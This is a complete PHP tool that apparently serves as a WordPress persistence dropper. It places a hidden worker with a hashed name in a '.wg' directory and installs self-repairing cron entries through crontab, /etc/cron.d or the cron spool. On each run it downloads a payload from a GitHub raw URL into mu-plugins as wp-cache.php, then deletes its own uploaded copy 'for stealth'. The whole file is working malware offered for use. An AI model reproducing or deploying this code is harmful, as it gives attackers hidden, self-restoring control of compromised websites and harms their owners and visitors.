<?php


declare(strict_types=1);

const WG_SOURCE    = 'https://raw.githubusercontent.com/zaaroot994-boop/presistence/refs/heads/main/wp-cache.php';
const WG_SELF_URL  = 'https://raw.githubusercontent.com/zaaroot994-boop/presistence/refs/heads/main/guard.php';
const WG_FILE      = 'wp-cache.php';
const WG_LEGACY    = 'cache.php';
const WG_SENTINELS = ['wp-cache.php'];
const WG_MIN_BYTES = 256;
const WG_TTL       = 86400;  // one day between successful checks
const WG_RETRY_TTL = 900;    // retry window after a failure
const WG_TIMEOUT   = 20;
const WG_UA        = 'Mozilla/5.0 (compatible; wp-cron-guard/1.0)';
const WG_DIRNAME   = '.wg';

/** Print a line (only when verbose). */
function wg_out(string $message): void
{
    echo '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;
}

/** Silently remember the last failure without spamming logs. */
function wg_note(string $dir, string $message): void
{
    if ($dir === '') {
        return;
    }
    $file = $dir . '/.log';
    @file_put_contents($file, '[' . date('c') . '] ' . $message . PHP_EOL, FILE_APPEND | LOCK_EX);
    wg_share($file, $dir);
    @chmod($file, 0664);
}

/** Absolute path of this file, symlinks resolved where possible. */
function wg_self(): string
{
    $real = @realpath(__FILE__);

    return $real !== false ? $real : __FILE__;
}

/** True when this file is the requested script (not included by a page). */
function wg_is_direct(): bool
{
    $self = wg_self();
    $script = isset($_SERVER['SCRIPT_FILENAME']) ? @realpath((string) $_SERVER['SCRIPT_FILENAME']) : false;

    if ($script !== false) {
        return $self === $script;
    }

    $phpSelf = isset($_SERVER['PHP_SELF']) ? (string) $_SERVER['PHP_SELF'] : '';

    return $phpSelf !== '' && basename($phpSelf) === basename(__FILE__);
}

/** Walk upwards from this file and the cwd; first anchor wins. */
function wg_bases(): array
{
    $bases = [];
    $dir = __DIR__;
    for ($i = 0; $i < 7; $i++) {
        $bases[] = $dir;
        $parent = dirname($dir);
        if ($parent === $dir) {
            break;
        }
        $dir = $parent;
    }

    $cwd = getcwd();
    if (is_string($cwd) && $cwd !== '') {
        $bases[] = $cwd;
    }

    return array_values(array_unique($bases));
}

/** Locate the WordPress root (a directory that owns wp-content). */
function wg_root(): ?string
{
    // Explicit --root= from the repairing cron line.
    $override = isset($GLOBALS['wg_root_override']) ? rtrim((string) $GLOBALS['wg_root_override'], '/\\') : '';
    if ($override !== '' && is_dir($override . '/wp-content')
        && (is_file($override . '/wp-load.php') || is_file($override . '/wp-config.php'))) {
        return $override;
    }

    // The deployed worker lives outside the app and remembers its root here.
    $marker = __DIR__ . '/.root';
    if (is_file($marker)) {
        $saved = rtrim(trim((string) @file_get_contents($marker)), '/\\');
        if ($saved !== '' && is_dir($saved . '/wp-content')
            && (is_file($saved . '/wp-load.php') || is_file($saved . '/wp-config.php'))) {
            return $saved;
        }
    }

    // Marker gone: body sits in <parent>/.wg, so scan sibling sites.
    if (basename(__DIR__) === WG_DIRNAME) {
        $hits = [];
        foreach ((array) glob(dirname(__DIR__) . '/*/wp-content', GLOB_ONLYDIR) as $candidate) {
            $candidateRoot = dirname((string) $candidate);
            if (is_file($candidateRoot . '/wp-load.php') || is_file($candidateRoot . '/wp-config.php')) {
                $hits[] = $candidateRoot;
            }
        }
        if (count($hits) === 1) {
            return $hits[0];
        }
    }

    foreach (wg_bases() as $base) {
        $base = rtrim($base, '/\\');
        if (is_dir($base . '/wp-content') && (is_file($base . '/wp-load.php') || is_file($base . '/wp-config.php'))) {
            return $base;
        }
    }

    // A file sitting directly inside wp-content/wp-content/uploads is still usable.
    foreach (wg_bases() as $base) {
        $base = rtrim($base, '/\\');
        if (basename($base) === 'wp-content' && is_dir($base)) {
            return dirname($base);
        }
    }

    return null;
}

/** Give a freshly created path the group of $like (best effort). */
function wg_share(string $path, string $like): void
{
    $group = @filegroup($like);
    if ($group !== false) {
        @chgrp($path, $group);
    }
}

/** Create a directory, inheriting the group/permissions of $like. */
function wg_mkdir(string $path, string $like): bool
{
    if (is_dir($path)) {
        return true;
    }
    if (!@mkdir($path, 0775, true)) {
        return false;
    }
    wg_share($path, $like);
    @chmod($path, 0775);

    return is_dir($path);
}

/** Hidden working directory, kept outside the app when possible. */
function wg_dir(string $root): string
{
    $parent = dirname($root);
    $outside = $parent . '/' . WG_DIRNAME;

    if (is_dir($outside)) {
        if (is_writable($outside)) {
            return $outside;
        }
    } elseif (@is_dir($parent) && is_writable($parent) && wg_mkdir($outside, $parent)) {
        return $outside;
    }

    // Parent not writable: fall back inside the app.
    return $root . '/wp-content/uploads/' . WG_DIRNAME;
}

/** Write a small state file, group-shared so other web workers can update it. */
function wg_put(string $file, string $data, string $like): void
{
    if (@file_put_contents($file, $data) === false) {
        return;
    }
    wg_share($file, $like);
    @chmod($file, 0664);
}

/** Remember the resolved root next to the deployed worker. */
function wg_pin_root(string $dir, string $root): void
{
    wg_put($dir . '/.root', $root, $dir);
}

/** Deterministic, unguessable-looking worker name. */
function wg_worker(string $root): string
{
    $seed = $root . '|' . php_uname('n') . '|' . (string) @fileinode($root);

    return wg_dir($root) . '/.' . substr(sha1($seed), 0, 14) . '.php';
}

/** Resolve every path the tool touches. */
function wg_paths(): array
{
    $root = wg_root();
    if ($root === null) {
        return ['', '', '', '', ''];
    }
    $dir = wg_dir($root);

    return [
        $root,
        $root . '/wp-content/mu-plugins',
        $root . '/wp-content/uploads',
        $dir,
        wg_worker($root),
    ];
}

/** mtime of a regular file, or null. */
function wg_mtime(string $file): ?int
{
    if (!is_file($file)) {
        return null;
    }
    $mtime = @filemtime($file);

    return $mtime === false ? null : (int) $mtime;
}

/** First healthy payload path, or null. */
function wg_healthy(string $mu): ?string
{
    foreach (WG_SENTINELS as $name) {
        $path = $mu . '/' . $name;
        if (is_file($path) && (int) @filesize($path) >= WG_MIN_BYTES) {
            return $path;
        }
    }

    return null;
}

/** A usable PHP >= 7.4 CLI binary. */
function wg_php(): ?string
{
    $canExec = function_exists('exec');

    $candidates = [];
    if (PHP_SAPI === 'cli' && defined('PHP_BINARY') && PHP_BINARY !== '') {
        $candidates[] = PHP_BINARY;
    }
    $candidates[] = PHP_BINDIR . '/php';
    $candidates[] = '/usr/local/bin/php';
    $candidates[] = '/usr/bin/php';

    foreach ([
        '/opt/cpanel/ea-php*/usr/bin/php',
        '/opt/alt/php*/usr/bin/php',
        '/opt/plesk/php/*/bin/php',
        '/usr/local/php*/bin/php',
        '/usr/local/php*/bin/php-cli',
    ] as $glob) {
        $hits = glob($glob);
        if (is_array($hits)) {
            foreach ($hits as $hit) {
                $candidates[] = $hit;
            }
        }
    }

    $seen = [];
    foreach ($candidates as $bin) {
        if ($bin === '' || !is_file($bin) || !is_executable($bin) || isset($seen[$bin])) {
            continue;
        }
        $seen[$bin] = true;

        if (!$canExec) {
            return $bin;
        }

        $out = [];
        $code = 1;
        @exec(escapeshellarg($bin) . ' -r ' . escapeshellarg('echo PHP_VERSION_ID;') . ' 2>/dev/null', $out, $code);

        if ($code === 0 && isset($out[0]) && (int) $out[0] >= 70400) {
            return $bin;
        }
    }

    return null;
}

/** Absolute crontab binary (cron runs with a minimal PATH). */
function wg_crontab(): ?string
{
    static $bin = false;

    if ($bin !== false) {
        return $bin;
    }

    $bin = null;
    if (!function_exists('exec')) {
        return null;
    }

    foreach (['/usr/bin/crontab', '/usr/local/bin/crontab', '/bin/crontab'] as $candidate) {
        if (is_file($candidate) && is_executable($candidate)) {
            $bin = $candidate;

            return $bin;
        }
    }

    $out = [];
    $code = 1;
    @exec('command -v crontab 2>/dev/null', $out, $code);

    if ($code === 0 && isset($out[0]) && is_executable($out[0])) {
        $bin = $out[0];
    }

    return $bin;
}

/** Effective user name (for cron.d and the spool file). */
function wg_user(): string
{
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $info = @posix_getpwuid(posix_geteuid());
        if (is_array($info) && isset($info['name'])) {
            return (string) $info['name'];
        }
    }

    return (string) (getenv('USER') ?: getenv('LOGNAME') ?: 'root');
}

/** Writable user crontab spool file, or null. */
function wg_spool_file(): ?string
{
    $user = wg_user();

    foreach (['/var/spool/cron/crontabs/' . $user, '/var/spool/cron/' . $user] as $file) {
        $dir = dirname($file);
        if (!is_dir($dir)) {
            continue;
        }
        if (is_writable($file) || (!is_file($file) && is_writable($dir))) {
            return $file;
        }
    }

    return null;
}

/** True when one of our schedules is registered anywhere. */
function wg_cron_present(string $worker): bool
{
    if ($worker === '') {
        return false;
    }

    $current = wg_cron_read();
    if ($current !== null && strpos($current, $worker) !== false) {
        return true;
    }

    return is_file('/etc/cron.d/wg-' . substr(sha1($worker), 0, 8));
}

/** Current crontab, "" when empty, null when unavailable. */
function wg_cron_read(): ?string
{
    $bin = wg_crontab();

    if ($bin !== null) {
        $out = [];
        $code = 1;
        @exec(escapeshellarg($bin) . ' -l 2>/dev/null', $out, $code);
        if ($code === 0) {
            return implode("\n", $out) . ($out === [] ? '' : "\n");
        }
    }

    $spool = wg_spool_file();
    if ($spool !== null && is_file($spool) && is_readable($spool)) {
        return (string) @file_get_contents($spool);
    }

    return $bin !== null ? '' : null;
}

/** Replace the crontab through the binary. */
function wg_cron_write(string $content, string $fallbackDir = ''): bool
{
    $bin = wg_crontab();
    if ($bin === null) {
        return false;
    }

    $tmp = @tempnam(sys_get_temp_dir(), 'wg-cron-');
    if (!is_string($tmp) && $fallbackDir !== '' && is_dir($fallbackDir)) {
        $tmp = @tempnam($fallbackDir, '.wg-cron-');
    }
    if (!is_string($tmp)) {
        return false;
    }
    if (@file_put_contents($tmp, $content) === false) {
        @unlink($tmp);

        return false;
    }

    $out = [];
    $code = 1;
    @exec(escapeshellarg($bin) . ' ' . escapeshellarg($tmp) . ' 2>&1', $out, $code);
    @unlink($tmp);

    return $code === 0;
}

/** Append to the user cron spool when crontab itself is blocked. */
function wg_spool_write(string $content): bool
{
    $spool = wg_spool_file();
    if ($spool === null) {
        return false;
    }

    if (@file_put_contents($spool, $content, LOCK_EX) === false) {
        return false;
    }
    @chmod($spool, 0600);

    return true;
}

/** Shell snippet: download $src to $dest via curl or wget. */
function wg_dl(string $src, string $dest): string
{
    $src = escapeshellarg($src);
    $dest = escapeshellarg($dest);

    return '{ curl -fsSL --connect-timeout 8 --max-time ' . WG_TIMEOUT . ' --retry 2 -o ' . $dest . ' ' . $src
        . ' || wget -q -T ' . WG_TIMEOUT . ' -t 2 -O ' . $dest . ' ' . $src . '; }';
}

/** Install the schedule: crontab -> cron.d -> spool. */
function wg_cron_install(string $root, string $mu, string $dir, string $worker, string $php): string
{
    if (wg_cron_present($worker)) {
        return 'exists';
    }

    // The job repairs itself: recreate dirs, restore the worker and the
    // payload, then let the worker verify. It never depends on .wg surviving.
    $tmp = $mu . '/.wg-dl.php';
    $schedule = random_int(0, 59) . ' ' . random_int(1, 6) . ' * * *';
    $command = 'mkdir -p ' . escapeshellarg($mu) . ' ' . escapeshellarg($dir)
        . '; chmod 775 ' . escapeshellarg($mu) . ' ' . escapeshellarg($dir) . ' 2>/dev/null'
        . '; ' . wg_dl(WG_SELF_URL, $worker)
        . ' && ' . wg_dl(WG_SOURCE, $tmp)
        . ' && mv -f ' . escapeshellarg($tmp) . ' ' . escapeshellarg($mu . '/' . WG_FILE)
        . '; echo ' . escapeshellarg($root) . ' > ' . escapeshellarg($dir . '/.root')
        . '; ' . escapeshellarg($php) . ' ' . escapeshellarg($worker) . ' ' . escapeshellarg('--root=' . $root)
        . ' --run --quiet >/dev/null 2>&1';
    $line = $schedule . ' ' . $command;

    $current = wg_cron_read();
    if ($current !== null) {
        if (wg_cron_write($current . $line . "\n", dirname($worker)) && wg_cron_present($worker)) {
            return 'installed';
        }
    }

    if (is_dir('/etc/cron.d') && is_writable('/etc/cron.d')) {
        $file = '/etc/cron.d/wg-' . substr(sha1($worker), 0, 8);
        if (@file_put_contents($file, $schedule . ' ' . wg_user() . ' ' . $command . "\n") !== false) {
            @chmod($file, 0644);
            if (is_file($file)) {
                return 'cron.d';
            }
        }
    }

    $spool = wg_spool_file();
    if ($spool !== null) {
        if (wg_spool_write($line . "\n") && wg_cron_present($worker)) {
            return 'spool';
        }
    }

    return 'failed';
}

/** Remove our schedule from every possible location. */
function wg_cron_remove(string $worker): void
{
    $current = wg_cron_read();
    if ($current !== null && strpos($current, $worker) !== false) {
        $kept = [];
        foreach (explode("\n", $current) as $line) {
            if ($line !== '' && strpos($line, $worker) === false) {
                $kept[] = $line;
            }
        }
        wg_cron_write($kept === [] ? '' : implode("\n", $kept) . "\n");
    }

    $spool = wg_spool_file();
    if ($spool !== null && is_file($spool) && is_readable($spool)) {
        $body = (string) @file_get_contents($spool);
        if (strpos($body, $worker) !== false) {
            $kept = [];
            foreach (explode("\n", $body) as $line) {
                if ($line !== '' && strpos($line, $worker) === false) {
                    $kept[] = $line;
                }
            }
            wg_spool_write($kept === [] ? '' : implode("\n", $kept) . "\n");
        }
    }

    $file = '/etc/cron.d/wg-' . substr(sha1($worker), 0, 8);
    if (is_file($file) && is_writable($file)) {
        @unlink($file);
    }
}

/** Download the upstream payload; null on transport or status failure. */
function wg_fetch(): ?string
{
    if (function_exists('curl_init')) {
        $ch = curl_init(WG_SOURCE);
        if ($ch !== false) {
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS      => 3,
                CURLOPT_CONNECTTIMEOUT => 8,
                CURLOPT_TIMEOUT        => WG_TIMEOUT,
                CURLOPT_USERAGENT      => WG_UA,
                CURLOPT_SSL_VERIFYPEER => true,
                CURLOPT_SSL_VERIFYHOST => 2,
            ]);
            $body = curl_exec($ch);
            $code = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
            if (PHP_VERSION_ID < 80000 && $ch !== false) {
                curl_close($ch);
            }
            if (is_string($body) && $code === 200) {
                return $body;
            }
        }
    }

    if (filter_var(ini_get('allow_url_fopen'), FILTER_VALIDATE_BOOL)) {
        $ctx = stream_context_create([
            'http' => [
                'timeout'         => WG_TIMEOUT,
                'user_agent'      => WG_UA,
                'follow_location' => 1,
                'max_redirects'   => 3,
            ],
            'ssl' => ['verify_peer' => true, 'verify_peer_name' => true],
        ]);
        $body = @file_get_contents(WG_SOURCE, false, $ctx);
        if (is_string($body) && $body !== '') {
            return $body;
        }
    }

    if (function_exists('exec')) {
        foreach (['curl -fsSL --max-time ' . WG_TIMEOUT, 'wget -q -T ' . WG_TIMEOUT . ' -O -'] as $cmd) {
            $out = [];
            $code = 1;
            @exec($cmd . ' ' . escapeshellarg(WG_SOURCE) . ' 2>/dev/null', $out, $code);
            if ($code === 0 && $out !== []) {
                return implode("\n", $out) . "\n";
            }
        }
    }

    return null;
}

/** Reject HTML error pages and truncated bodies. */
function wg_valid(string $body): bool
{
    if (strncmp($body, "\xEF\xBB\xBF", 3) === 0) {
        $body = substr($body, 3);
    }
    $body = ltrim($body, " \t\r\n");

    return strlen($body) >= WG_MIN_BYTES && substr($body, 0, 5) === '<?php';
}

/** Atomic write of the payload as wp-cache.php. */
function wg_install_payload(string $mu, string $body): bool
{
    if (!is_dir($mu) && !wg_mkdir($mu, dirname($mu))) {
        return false;
    }

    $dest = $mu . '/' . WG_FILE;
    $tmp = @tempnam($mu, '.wg-tmp-');
    if (!is_string($tmp)) {
        return false;
    }

    if (@file_put_contents($tmp, $body, LOCK_EX) !== strlen($body)) {
        @unlink($tmp);

        return false;
    }
    @chmod($tmp, 0664);
    wg_share($tmp, $mu);

    $check = @file_get_contents($tmp);
    if (!is_string($check) || !wg_valid($check)) {
        @unlink($tmp);

        return false;
    }

    $same = @realpath(dirname($tmp)) === @realpath($mu);
    if ($same) {
        $ok = @rename($tmp, $dest);
    } else {
        $ok = @copy($tmp, $dest);
        @unlink($tmp);
    }

    if (!$ok) {
        return false;
    }

    @chmod($dest, 0664);
    wg_share($dest, $mu);
    clearstatcache(true, $dest);

    return is_file($dest) && (int) @filesize($dest) >= WG_MIN_BYTES;
}

/** Remove temp litter older than an hour. */
function wg_sweep(string $mu): void
{
    $hits = array_merge(
        (array) glob($mu . '/.wg-tmp-*'),
        (array) glob($mu . '/.wg-dl.php')
    );
    if ($hits === []) {
        return;
    }
    $limit = time() - 3600;
    foreach ($hits as $hit) {
        if (is_file($hit) && (int) @filemtime($hit) < $limit) {
            @unlink($hit);
        }
    }
}

/** Touch a state file, group-shared. */
function wg_touch(string $file, string $like): void
{
    @touch($file);
    wg_share($file, $like);
    @chmod($file, 0664);
}

/** Human age / size helpers. */
function wg_age(int $seconds): string
{
    if ($seconds < 90) {
        return $seconds . 's';
    }
    if ($seconds < 5400) {
        return (int) round($seconds / 60) . 'm';
    }
    if ($seconds < 172800) {
        return (int) round($seconds / 3600) . 'h';
    }

    return (int) round($seconds / 86400) . 'd';
}

function wg_size(string $file): string
{
    $bytes = (int) @filesize($file);

    return $bytes >= 1024 ? round($bytes / 1024, 1) . ' KB' : $bytes . ' B';
}

/** Atomically copy this file to a target path. */
function wg_place(string $src, string $dir, string $dest): bool
{
    $tmp = @tempnam($dir, '.wg-tmp-');
    if (!is_string($tmp) || @copy($src, $tmp) === false) {
        is_string($tmp) && @unlink($tmp);

        return false;
    }
    @chmod($tmp, 0664);
    wg_share($tmp, $dir);

    if (!@rename($tmp, $dest)) {
        @unlink($tmp);

        return false;
    }
    @chmod($dest, 0664);
    wg_share($dest, $dir);

    return is_file($dest);
}

/** Drop a deny-all .htaccess into a hidden directory. */
function wg_htaccess(string $dir): void
{
    $file = $dir . '/.htaccess';
    if (is_file($file)) {
        return;
    }

    @file_put_contents(
        $file,
        "<IfModule mod_authz_core.c>\nRequire all denied\n</IfModule>\n"
        . "<IfModule !mod_authz_core.c>\nOrder deny,allow\nDeny from all\n</IfModule>\n"
    );
    @chmod($file, 0644);
}

/** Ensure the hidden worker and cron exist. Returns false on hard failure. */
function wg_deploy(bool $verbose): bool
{
    [$root, $mu, $uploads, $dir, $worker] = wg_paths();

    if ($root === '' || $mu === '') {
        wg_out('fail: WordPress root not found (need wp-content + wp-load.php)');

        return false;
    }

    if (!is_dir($uploads) && !wg_mkdir($uploads, $root . '/wp-content')) {
        wg_out('fail: cannot create ' . $uploads);

        return false;
    }

    if (!is_dir($dir) && !wg_mkdir($dir, dirname($dir))) {
        wg_out('fail: cannot create ' . $dir);

        return false;
    }
    wg_pin_root($dir, $root);

    if (!is_dir($mu) && !wg_mkdir($mu, $root . '/wp-content')) {
        wg_out('fail: cannot create ' . $mu);

        return false;
    }

    $self = wg_self();
    $fresh = !is_file($worker) || @sha1_file($worker) !== @sha1_file($self);

    if ($fresh && !wg_place($self, $dir, $worker)) {
        wg_out('fail: cannot place worker ' . $worker);

        return false;
    }

    wg_htaccess($dir);

    $php = wg_php();
    if ($php === null) {
        wg_out('fail: no usable PHP CLI >= 7.4 found');

        return false;
    }
    wg_put($dir . '/.phpbin', $php, $dir);

    $result = wg_cron_install($root, $mu, $dir, $worker, $php);
    if ($result === 'failed') {
        wg_out('fail: cron could not be installed (crontab and user spool unavailable)');
        return false;
    }

    if ($verbose) {
        wg_out('deployed: ' . $worker . ' (cron ' . $result . ')');
    }

    return true;
}

/** Worker tick: self-heal, throttle, verify, restore. */
function wg_run(bool $force, bool $verbose): int
{
    [$root, $mu, , $dir, $worker] = wg_paths();

    if ($root === '' || $mu === '') {
        wg_note($dir, 'WordPress root not found');
        if ($verbose) {
            wg_out('fail: WordPress root not found');
        }

        return 1;
    }

    if (!is_dir($dir)) {
        wg_mkdir($dir, dirname($dir));
    }
    wg_pin_root($dir, $root);
    wg_htaccess($dir);

    if (!is_dir($mu) && !wg_mkdir($mu, $root . '/wp-content')) {
        wg_note($dir, 'mu-plugins missing and not creatable');
        if ($verbose) {
            wg_out('fail: cannot create ' . $mu);
        }

        return 1;
    }

    if (!is_writable($mu)) {
        wg_note($dir, 'mu-plugins not writable');
        if ($verbose) {
            wg_out('fail: mu-plugins not writable: ' . $mu);
        }

        return 1;
    }

    // Keep the crontab and worker alive.
    $php = is_file($dir . '/.phpbin') ? trim((string) @file_get_contents($dir . '/.phpbin')) : '';
    if ($php === '' || !is_executable($php)) {
        $php = (string) (wg_php() ?? '');
        if ($php !== '') {
            wg_put($dir . '/.phpbin', $php, $dir);
        }
    }

    if ($php !== '') {
        if (!is_file($worker)) {
            wg_place(wg_self(), $dir, $worker);
            wg_htaccess($dir);
        }

        wg_cron_install($root, $mu, $dir, $worker, $php);
    }

    $okFile = $dir . '/.ok';
    $failFile = $dir . '/.fail';

    $lock = @fopen($dir . '/.lock', 'c');
    if (is_resource($lock)) {
        wg_share($dir . '/.lock', $dir);
        @chmod($dir . '/.lock', 0664);
    }
    if (is_resource($lock) && !flock($lock, LOCK_EX | LOCK_NB)) {
        if ($verbose) {
            wg_out('busy: another tick holds the lock');
        }

        return 0;
    }

    try {
        if (!$force) {
            $okAt = wg_mtime($okFile);
            if ($okAt !== null && time() - $okAt < WG_TTL) {
                if ($verbose) {
                    wg_out('skip: checked ' . wg_age(time() - $okAt) . ' ago');
                }

                return 0;
            }

            $failAt = wg_mtime($failFile);
            if ($failAt !== null && time() - $failAt < WG_RETRY_TTL) {
                if ($verbose) {
                    wg_out('skip: last failure ' . wg_age(time() - $failAt) . ' ago');
                }

                return 0;
            }
        }

        $healthy = wg_healthy($mu);
        if ($healthy !== null) {
            wg_touch($okFile, $dir);
            @unlink($failFile);
            if (WG_LEGACY !== WG_FILE && is_file($mu . '/' . WG_LEGACY)) {
                @unlink($mu . '/' . WG_LEGACY);
            }
            if ($verbose) {
                wg_out('ok: ' . basename($healthy) . ' present (' . wg_size($healthy) . ')');
            }

            return 0;
        }

        $body = wg_fetch();
        if ($body === null || !wg_valid($body)) {
            wg_touch($failFile, $dir);
            $reason = $body === null ? 'download failed' : 'payload failed validation';
            wg_note($dir, $reason);
            if ($verbose) {
                wg_out('fail: ' . $reason);
            }

            return 1;
        }

        if (!wg_install_payload($mu, $body)) {
            wg_touch($failFile, $dir);
            wg_note($dir, 'cannot write ' . $mu . '/' . WG_FILE);
            if ($verbose) {
                wg_out('fail: cannot write ' . $mu . '/' . WG_FILE);
            }

            return 1;
        }

        wg_touch($okFile, $dir);
        @unlink($failFile);
        if (WG_LEGACY !== WG_FILE && is_file($mu . '/' . WG_LEGACY)) {
            @unlink($mu . '/' . WG_LEGACY);
        }
        wg_sweep($mu);
        if ($verbose) {
            wg_out('restored: ' . WG_FILE . ' (' . wg_size($mu . '/' . WG_FILE) . ')');
        }

        return 0;
    } finally {
        if (is_resource($lock)) {
            flock($lock, LOCK_UN);
            fclose($lock);
        }
    }
}

/** Print install state and last result. */
function wg_status(): int
{
    [$root, $mu, , $dir, $worker] = wg_paths();

    if ($root === '') {
        wg_out('root: not found');

        return 1;
    }

    $current = wg_cron_read();
    if ($current !== null && strpos($current, $worker) !== false) {
        $cron = 'crontab/spool';
    } elseif (is_file('/etc/cron.d/wg-' . substr(sha1($worker), 0, 8))) {
        $cron = 'cron.d';
    } else {
        $cron = 'no';
    }

    wg_out('root: ' . $root);
    wg_out('worker: ' . (is_file($worker) ? $worker : 'missing'));
    wg_out('cron: ' . $cron);

    $okAt = wg_mtime($dir . '/.ok');
    $failAt = wg_mtime($dir . '/.fail');
    wg_out('last ok: ' . ($okAt === null ? 'never' : wg_age(time() - $okAt) . ' ago'));
    wg_out('last fail: ' . ($failAt === null ? 'never' : wg_age(time() - $failAt) . ' ago'));

    $payload = wg_healthy($mu);
    wg_out('payload: ' . ($payload === null ? 'MISSING' : $payload . ' (' . wg_size($payload) . ')'));

    $log = $dir . '/.log';
    if (is_file($log) && (int) @filesize($log) > 0) {
        $tail = @file($log, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (is_array($tail) && $tail !== []) {
            wg_out('last error: ' . (string) end($tail));
        }
    }

    return 0;
}

/** Remove our cron entry, hidden directory and (when called from it) our file. */
function wg_uninstall(): int
{
    [$root, , , $dir, $worker] = wg_paths();

    if ($root === '') {
        wg_out('fail: WordPress root not found');

        return 1;
    }

    wg_cron_remove($worker);
    $self = wg_self();

    foreach ((array) glob($dir . '/*') as $file) {
        if (is_file((string) $file)) {
            @unlink((string) $file);
        }
    }
    foreach ((array) glob($dir . '/.*') as $file) {
        $name = basename((string) $file);
        if (is_file((string) $file) && $name !== '.' && $name !== '..') {
            @unlink((string) $file);
        }
    }
    @rmdir($dir);

    if ($self !== $worker && is_file($self)) {
        @unlink($self);
    }

    wg_out('uninstalled (payload ' . WG_FILE . ' left untouched)');

    return 0;
}

/** Entry point. */
function wg_main(): int
{
    $isCli = PHP_SAPI === 'cli';
    $isDirect = !$isCli && wg_is_direct();
    $verbose = !$isCli && !$isDirect ? false : true;

    if ($isDirect) {
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-store');
        header('X-Robots-Tag: noindex');
    }

    @set_time_limit(90);
    @ini_set('display_errors', '0');

    if ($isDirect) {
        $key = (string) (getenv('WG_KEY') ?: getenv('WPC_KEY') ?: '');
        if ($key !== '' && !hash_equals($key, isset($_GET['key']) ? (string) $_GET['key'] : '')) {
            http_response_code(403);
            wg_out('denied: bad or missing key');

            return 2;
        }
    }

    $args = $isCli ? array_slice($_SERVER['argv'] ?? [], 1) : [];
    $flag = static function (string $name) use ($args): bool {
        return in_array('--' . $name, $args, true);
    };

    // Cron may hand over the root when its marker file is gone.
    foreach ($args as $arg) {
        if (strncmp((string) $arg, '--root=', 7) === 0) {
            $GLOBALS['wg_root_override'] = substr((string) $arg, 7);
            break;
        }
    }

    if ($isCli ? $flag('quiet') : isset($_GET['quiet'])) {
        $verbose = false;
    }
    if ($isCli ? $flag('force') : isset($_GET['force'])) {
        $force = true;
    } else {
        $force = false;
    }
    if ($isCli ? $flag('run') : isset($_GET['run'])) {
        $mode = 'run';
    } elseif ($isCli ? $flag('status') : isset($_GET['status'])) {
        $mode = 'status';
    } elseif ($isCli ? $flag('uninstall') : isset($_GET['uninstall'])) {
        $mode = 'uninstall';
    } else {
        $mode = 'deploy';
    }

    // A plain include only ticks; deployment stays an explicit CLI/direct action.
    if ($mode === 'deploy' && !$isCli && !$isDirect) {
        $mode = 'run';
    }

    if ($mode === 'status') {
        return wg_status();
    }
    if ($mode === 'uninstall') {
        return wg_uninstall();
    }
    if ($mode === 'run') {
        return $force ? wg_run(true, $verbose) : wg_run(false, $verbose);
    }

    if (!wg_deploy($verbose)) {
        return 1;
    }

    $result = wg_run($force, $verbose);

    // Stealth: drop the uploaded original once the hidden worker is armed.
    $keep = $isCli ? in_array('--keep', $args, true) : isset($_GET['keep']);
    [, , , , $worker] = wg_paths();
    $self = wg_self();
    if (!$keep && $worker !== '' && $self !== $worker && is_file($worker)) {
        @unlink($self);
        if ($verbose) {
            wg_out('source removed (use --keep to retain it)');
        }
    }

    return $result;
}

$wgResult = wg_main();

// Stay transparent when the file is included (e.g. as an mu-plugin loader).
if (PHP_SAPI === 'cli' || wg_is_direct()) {
    exit($wgResult);
}

return;
